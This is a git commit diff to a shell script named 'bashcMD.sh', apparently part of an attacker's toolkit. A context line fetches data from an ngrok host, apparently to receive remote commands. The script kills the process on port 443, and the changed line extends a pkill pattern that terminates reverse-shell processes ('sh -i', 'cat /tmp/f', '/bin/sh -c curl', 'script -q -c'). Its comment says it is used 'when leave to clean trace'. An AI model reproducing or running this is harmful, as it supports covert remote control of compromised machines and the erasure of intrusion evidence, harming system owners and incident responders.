0006b80290077a9f068eed263c94c67b7ff66d4b
MOZZES650 <110117895+MOZZES650@users.noreply.github.com>
2025-12-22 18:25:53 +0100

    Modify pkill command for trace cleanup
    Updated pkill command to include script execution for cleaning traces.

--- bashcMD.sh
+++ bashcMD.sh
@@ -2,7 +2,7 @@ curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:
 
 #kill
 kill -9 $(lsof -t -i :443)
-pkill -u mangalamuhurtha -f "acpid.socket|sh -i|cat /tmp/f|/bin/sh -c curl"
+pkill -u mangalamuhurtha -f "acpid.socket|sh -i|cat /tmp/f|/bin/sh -c curl|script -q -c" # use when leave to clean trace
 #cron job
 
 # Looks cryptic at a glance
